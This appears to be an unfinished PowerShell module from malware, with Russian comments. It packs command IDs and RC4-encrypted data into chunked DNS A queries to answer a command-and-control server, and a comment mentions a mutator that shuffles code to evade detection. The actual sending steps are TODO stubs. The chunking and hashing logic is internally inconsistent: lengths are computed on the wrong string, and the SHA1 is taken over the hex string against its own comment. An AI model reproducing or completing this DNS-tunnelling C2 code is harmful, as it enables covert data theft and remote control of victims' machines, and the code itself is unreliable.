<#
dns_answer - отправка ответа на управляющий сервер посредством DNS запроса A
#>
function dns_answer {param(
	[UInt32]$build_id,
	[UInt32]$session_id,
	[UInt16]$command_id,
	[UInt32]$module_id,
	[string]$data,
	[string]$key
	)
	
	$result = 0;
	
	# длина данных
	$len = $data.Length;
	# размер блока = 100, но в хекс будет x2
	$bsize = 100*2;
	# кол-во пакетов c полным размером блока
	$count =[Math]::Floor($len / $bsize);
	# остаток
	$remainder = $len % $bsize;
	# общее число пакетов
	$total = $count;
	# +1 пакет с остатком, или это единственный пакет
	if ($remainder){ $total++ };
	
	<# 
	формирование START блока (старт блок не шифруется, т.к. содержит только hex-числа)
	
	ANSWER PACKET START
	packet_number = 0x0000
	data_size = 1 byte
	data - ...
	
	формат поля data:
	
	$build_id = 4 byte - зашито в скрипт
	session_id = 3 byte - 
	command_id = 1 byte - приходит с командой и возвращается как ответ на эту команду
	module_id = 4 byte - ID модуля кому предназначена команда (приходит с командой и возвращается как ответ на эту команду) может быть 0, зависит от команды
	packets_count = 4 byte - ожидаемое число пакетов для приема
	
	#>
	$build_id_x = [String]::Format("{0:X8}", $build_id);
	$session_id_x = [String]::Format("{0:X6}", $session_id);
	$command_id_x = [String]::Format("{0:X4}", $command_id);
	$module_id_x = [String]::Format("{0:X8}", $module_id);
	$packets_count = [String]::Format("{0:X8}", [UInt32]$total);
	# порядок присваивания может быть перемешан мутатором в любом порядке
	
	$buffer = $build_id_x + $session_id_x + $command_id_x + $module_id_x + $packets_count;
	$start_url = "0000" + ([String]::Format("{0:X2}", $buffer.Length)) + $buffer;
	
	# отправка START
	#
	#
	#

	# шифр
	$enc = [System.Text.Encoding]::UTF8;
	$buffer = $Enc.GetBytes($data);
	$k = $Enc.GetBytes($key);
	$rc4 = [System.BitConverter]::ToString((RC4 $buffer $k)) -replace '-','';
	
	<#
	ANSWER PACKET (промежуточный пакет отправки)
	packet_number = 2 byte (1..N)
	data_size = 1 byte
	data = 1..100

	total size(hex str): 8..206 bytes
	#>
	
	# счетчик пакетов
	$i=1; $count++;
	
	# отправка блоков >1
	# сюда никогда не зайдет, если блок единственный
	for($i; $i -lt $count; $i++)
	{
		$chunk = $rc4.Substring($i * $bsize, $bsize);
		
		# формирование блока
		$packet_url = ([String]::Format("{0:X4}", $i)) + ([String]::Format("{0:X2}", $chunk.Length)) + $chunk;
		
		# отправка
		#
		# TO DO
	}
	
	# отправка остаточного блока (или единственного)
	if ($remainder)
	{
		$chunk = $rc4.Substring($len - $remainder);
		
		# формирование блока
		$packet_url = ([String]::Format("{0:X4}", $i)) + ([String]::Format("{0:X2}", $chunk.Length)) + $chunk;
		
		# отправка
		#
		# TO DO
	}
	
	<# 
	формирование END блока (END блок не шифруется, т.к. содержит только hex-числа и sha1)
	
	ANSWER PACKET END
	packet_number = 0xFFFF
	data_size = 1 byte - длина sha1 хеша всегда 20 байт, что в хекс строке = 40 байт = 0x28 можно записать без вычислений
	data - sha1 от массива байт RC4 buffer (ВНИМАНИЕ не от хекс строки!! иначе не сойдутся хеши)
	#>
	$sha1 = [System.BitConverter]::ToString((New-Object System.Security.Cryptography.SHA1CryptoServiceProvider).ComputeHash($Enc.GetBytes($rc4))) -replace '-','';
	$end_url = "FFFF28" + $sha1;
	$end_url
	
	# отправка END
	#
	#
	#
	
	$result;
}
